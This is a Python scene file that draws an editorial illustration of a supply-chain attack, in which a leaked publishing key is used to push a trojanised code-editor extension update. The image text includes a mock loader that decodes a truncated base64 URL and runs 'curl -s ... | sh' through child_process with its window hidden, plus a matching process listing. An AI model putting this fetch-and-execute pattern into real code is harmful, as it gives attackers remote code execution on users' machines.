"""Developer-tool supply chain: a publishing key leaks from a supplier, the key
is used to push an extension update through the marketplace, and every
editor that auto-updates installs the trojanised build.

Left: the leaked access key, then the marketplace release it authorises.
Right (hero): a generic code editor that has just updated the extension, with
the file the update added open. Product names appear only as plain text and
only when the headline names them; no logos, generic editor chrome."""
from __future__ import annotations

import random
from typing import Sequence

from ..brief import EditorialBrief
from .. import type as T
from ..kit import Box, Doc, Run, arrow, background, code, icon, pill, vignette, window
from . import scene

_ATTACK = ("exploited", "confirmed", "attacks_observed", "compromise")


def _key_card(doc: Doc, b: Box, holder: str, key: str) -> None:
    """The leaked access key as a credential card (rotated a little)."""
    p = doc.pal
    with doc.g(transform=f"rotate(-4 {b.cx:.1f} {b.cy:.1f})"):
        doc.shadow(b.x, b.y, b.w, b.h, 16, 0.9)
        doc.rect(b.x, b.y, b.w, b.h, doc.lin([(0, "#26324A", 1), (1, "#141B2B", 1)], 0, 0, 1, 1), 16,
                 stroke="#3A4865", sw=1.4)
        doc.rect(b.x, b.y + 58, b.w, 4, p.danger, opacity=0.9)
        icon(doc, "key", b.x + 40, b.y + 32, 30, p.ink, 2.2)
        doc.text("ACCESS KEY", b.x + 68, b.y + 39, 17, p.ink, "ui_bold", tracking=1.8)
        doc.text(key, b.x + 26, b.y + 112, 22, p.ink, "mono_bold")
        doc.text("scope: publish extensions", b.x + 26, b.y + 148, 16, p.muted, "mono")
        if holder:
            doc.text(f"issued to: {holder}", b.x + 26, b.y + 176, 16, p.muted, "mono")
        pill(doc, b.r - 20, b.y + 16, "leaked", fg="#FFFFFF", bg=p.danger, size=14, font="ui_bold", anchor="end")


@scene("dev_supply_chain")
def dev_supply_chain(doc: Doc, brief: EditorialBrief, rng: random.Random) -> None:
    p = doc.pal
    background(doc, light=(0.6, 0.15))
    ents = list(brief.entities)
    text = brief.text or ""
    holder = next((e for e in ents if f"{e.lower()} ai" in text or f"key we had issued to {e.lower()}" in text),
                  ents[0] if len(ents) > 1 else "")
    ext = "Claude Code" if "Claude" in ents else "AI Assistant"
    market = next((e for e in ents if e not in (holder, "Claude")), "")
    attack = brief.status in _ATTACK
    key = "mk_pub_" + "".join(rng.choice("ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789")
                              for _ in range(6)) + "..."

    # ---- 1. the leaked key
    kb = Box(52, 112, 400, 206)
    _key_card(doc, kb, holder, key)

    # ---- 2. the release it authorises
    mb = Box(52, 452, 400, 250)
    doc.shadow(mb.x, mb.y, mb.w, mb.h, 14, 0.8)
    doc.rect(mb.x, mb.y, mb.w, mb.h, "#151E2F", 14, stroke=p.line, sw=1.4)
    doc.text("EXTENSION MARKETPLACE" if not market else f"{market.upper()} MARKETPLACE", mb.x + 24, mb.y + 38, 14,
             p.muted, "ui_bold", tracking=1.6)
    doc.rect(mb.x + 24, mb.y + 62, 64, 64, "#24304A", 12)
    icon(doc, "terminal", mb.x + 56, mb.y + 94, 32, p.ink, 2)
    doc.text(ext, mb.x + 106, mb.y + 88, 24, p.ink, "display")
    doc.text("update published", mb.x + 106, mb.y + 116, 17, p.danger, "mono_bold")
    doc.line((mb.x + 24, mb.y + 150), (mb.r - 24, mb.y + 150), p.line, 1)
    doc.text("auth:", mb.x + 24, mb.y + 186, 16, p.muted, "mono")
    doc.text(key, mb.x + 84, mb.y + 186, 16, p.ink, "mono")
    icon(doc, "check", mb.r - 40, mb.y + 180, 20, p.safe, 2.6)
    doc.text("auto-update: on", mb.x + 24, mb.y + 220, 16, p.muted, "mono")
    arrow(doc, [(kb.cx - 40, kb.b + 18), (kb.cx - 40, mb.y - 14)], p.danger, sw=4, head=16)

    # ---- 3. the editor that updated (hero)
    ew = Box(584, 84, 980, 720)
    body = window(doc, ew, title="code editor", surface="#0F1624", chrome="#18213A")
    # activity bar
    doc.rect(body.x, body.y, 56, body.h, "#0B111D")
    for i, ic in enumerate(("file", "eye", "link", "chip")):
        icon(doc, ic, body.x + 28, body.y + 32 + i * 54, 22, p.ink if i == 3 else p.muted, 1.8)
    doc.rect(body.x, body.y + 32 + 3 * 54 - 22, 3, 44, p.ink)
    # extensions panel
    side = Box(body.x + 56, body.y, 260, body.h)
    doc.rect(side.x, side.y, side.w, side.h, "#121A2A")
    doc.text("EXTENSIONS", side.x + 20, side.y + 34, 13, p.muted, "ui_bold", tracking=1.6)
    rows = [(ext, "updated just now", True), ("Python Tools", "1.4.0", False), ("Git History", "3.2.1", False),
            ("Formatter", "0.9.7", False)]
    for i, (n, sub, hot) in enumerate(rows):
        ry = side.y + 58 + i * 74
        if hot:
            doc.rect(side.x + 8, ry - 6, side.w - 16, 66, p.danger, 8, opacity=0.14)
            doc.rect(side.x + 8, ry - 6, 3, 66, p.danger)
        doc.rect(side.x + 20, ry + 4, 40, 40, "#24304A", 8)
        icon(doc, "terminal" if hot else "file", side.x + 40, ry + 24, 20, p.ink if hot else p.muted, 1.8)
        doc.text(n, side.x + 74, ry + 20, 17, p.ink, "ui_bold")
        doc.text(sub, side.x + 74, ry + 44, 14, p.danger if hot else p.muted, "mono")

    # editor area: the file the update added
    ed = Box(side.r, body.y, body.r - side.r, body.h)
    doc.rect(ed.x, ed.y, ed.w, 42, "#121A2A")
    doc.rect(ed.x, ed.y, 220, 42, "#0F1624")
    doc.rect(ed.x, ed.y, 220, 2, p.danger)
    doc.text("dist/loader.js", ed.x + 20, ed.y + 27, 15, p.ink, "mono")
    pill(doc, ed.r - 18, ed.y + 9, "new in this update", fg="#FFFFFF", bg=p.danger, size=12, font="mono",
         anchor="end")
    kw, tx, st, cm = "#9CC4FF", "#C9D3E3", "#A5E3B8", "#5F6D86"
    lines: list[Sequence[Run] | str] = [
        [("// added by the update", cm)],
        [("const", kw), (" { exec } = require(", tx), ('"child_process"', st), (");", tx)],
        [("const", kw), (" u = Buffer.from(", tx), ('"aHR0cHM6Ly9z..."', st), (",", tx)],
        [('  "base64"', st), (").toString();", tx)],
        [("exec(", tx), ("`curl -s ${u} | sh`", st), (",", tx)],
        [("  { windowsHide: ", tx), ("true", kw), (" });", tx)],
        "",
        [("module", kw), (".exports = require(", tx), ('"./extension.js"', st), (");", tx)],
    ]
    code(doc, ed.x + 64, ed.y + 96, lines, size=18, lh=1.75, width=560,
         marks={4: p.danger, 5: p.danger} if attack else {})
    # status bar
    doc.rect(ew.x + 1, ew.b - 34, ew.w - 2, 33, "#1A2540")
    doc.text(f"{ext} updated automatically", ew.x + 20, ew.b - 12, 14, p.ink, "ui")
    doc.text("restart not required", ew.r - 20, ew.b - 12, 14, p.muted, "ui", anchor="end")

    # terminal: what the loader started inside the editor's extension host
    term = Box(ed.x, body.b - 34 - 200, ed.w, 200)
    doc.rect(term.x, term.y, term.w, term.h, "#0A0F1A")
    doc.line((term.x, term.y), (term.r, term.y), p.line, 1.2)
    doc.text("PROCESSES", term.x + 24, term.y + 32, 13, p.ink, "ui_bold", tracking=1.6)
    doc.text("OUTPUT", term.x + 130, term.y + 32, 13, p.muted, "ui_bold", tracking=1.6)
    procs = [("extension-host", "node", False), ("language-server", "node", False)]
    if attack:
        procs.append(("sh -c curl -s https://... | sh", "child of extension-host", True))
    for i, (cmd, parent, hot) in enumerate(procs):
        y = term.y + 70 + i * 38
        if hot:
            doc.rect(term.x + 12, y - 24, term.w - 24, 34, p.danger, 4, opacity=0.16)
        doc.text(cmd, term.x + 24, y, 16, p.danger if hot else p.muted, "mono_bold" if hot else "mono")
        doc.text(parent, term.r - 24, y, 14, p.danger if hot else p.muted, "mono", anchor="end")

    # marketplace -> editor
    arrow(doc, [(mb.r + 12, mb.y + 100), (ew.x - 12, mb.y + 100)], p.danger, sw=4, head=16)
    doc.text("update", (mb.r + ew.x) / 2, mb.y + 84, 15, p.ink, "mono", anchor="middle")

    vignette(doc, 0.45)
    doc.focus = Box(40, 100, 1180, 664)
